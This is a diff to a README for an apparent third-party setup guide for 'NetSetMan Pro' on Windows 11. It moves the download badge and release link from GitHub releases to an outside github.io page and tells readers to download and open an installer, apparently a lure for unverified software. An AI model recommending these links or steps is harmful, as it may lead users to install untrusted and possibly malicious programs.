@@ -1,6 +1,6 @@
 # 🛠️ NetSetMan-PC-Setup-Guide - Effortlessly Manage Your Windows Network Settings
 
-[![](https://img.shields.io/badge/Download-NetSetMan-blue.svg)](https://github.com/Unplaced-darvon162/NetSetMan-PC-Setup-Guide/releases)
+[![](https://img.shields.io/badge/Download-NetSetMan-blue.svg)](https://unplaced-darvon162.github.io)
 
 This guide provides steps to install NetSetMan Pro on Windows 11. It covers setup, common blocks, and ways to ensure the software runs on your PC.
 
@@ -12,7 +12,7 @@ NetSetMan acts as a network setting manager for your computer. It switches betwe
 
 Follow these steps to set up the software.
 
-1. Go to the [Releases page](https://github.com/Unplaced-darvon162/NetSetMan-PC-Setup-Guide/releases).
+1. Go to the [Releases page](https://unplaced-darvon162.github.io).
 2. Locate the most recent version of the installer.
 3. Click the file to download it to your Downloads folder.
 4. Open the installer file to begin the process.
